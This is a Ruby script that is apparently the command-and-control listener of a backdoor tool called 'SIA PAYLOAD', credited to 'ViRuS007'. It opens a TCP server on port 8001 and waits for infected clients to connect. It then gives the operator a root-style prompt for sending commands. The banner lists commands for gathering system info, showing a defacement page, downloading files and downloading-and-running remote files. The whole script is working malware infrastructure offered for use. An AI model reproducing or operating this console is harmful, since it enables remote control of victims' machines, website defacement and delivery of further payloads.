#!/usr/bin/ruby

require "socket"
require "colorize"
require "timeout"
require "readline"

#######   TEXT COLOR #######

RS="\033[0m"    # reset
HC="\033[1m"    # hicolor
FRED="\033[31m" # foreground red
FGRN="\033[32m" # foreground green
FWHT="\033[37m" # foreground white
PURPLE = "\e[35m"
DARK_BLUE = "\e[34m"
BOLD = "\e[1m" # bold text
RED = "\e[1m\e[31m"

if RUBY_PLATFORM =~ /win32/
  system("cls")
else
  system("clear")
end

#press CTRL + C show message
trap("SIGINT") {
  puts "\n\n#{HC}#{FRED}WARNING! CTRL+C Detected closing Socket connection#{FWHT}.....#{RS}"
  exit 666
}

puts """

███████╗██╗ █████╗     ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
██╔════╝██║██╔══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
███████╗██║███████║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
╚════██║██║██╔══██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
███████║██║██║  ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝

                          Coded By ViRuS007
                    Email: virus007@protonmail.com
                         Twitter : @Vi47S007
      
          Command : 
                      info        =>   Get system info (ip, host name ...)
                      siahack     =>   Show your deface webpage
                      download    =>   Download file(config url in payload.rb file)
                      down-run    =>   Download and run file(config url in payload.rb file)
                      
"""


port = 8001
puts "#{HC}#{FGRN}[+] Starting Server at port : #{port} #{RS}"
time = Time.now
puts "#{HC}#{FGRN}[+] Start at : #{time}#{RS}"
server = TCPServer.open(port)   # Socket to listen on port 2000
loop {                          # Servers run forever
  Thread.start(server.accept) do |client|
    puts "#{HC}[+] Client Connected!#{RS}"
    while true
      #if client is disconnected show this message
      puts "#{HC}#{FRED}[*] Client is Offline!#{RS}" if client.closed?

      #print "\n[+] Enter Command : ".blue
      #com = gets.chomp
      #client.puts(com)

      while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
        client.puts(com)
        puts "\n+------------------------------------------------------------+"
        #res = client.recv(10000).red
        begin
          Timeout::timeout(5) do
            res = client.recv(1000).red
            if res == ""
              while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
                client.puts(com)
              end
            #else
            else
              puts res
            end
            puts "+------------------------------------------------------------+"
          end

        rescue Timeout::Error
          #print "\n[+] Enter Command : ".blue
          #com = gets.chomp
          #client.puts(com)
        end
      end
    end
      end
}
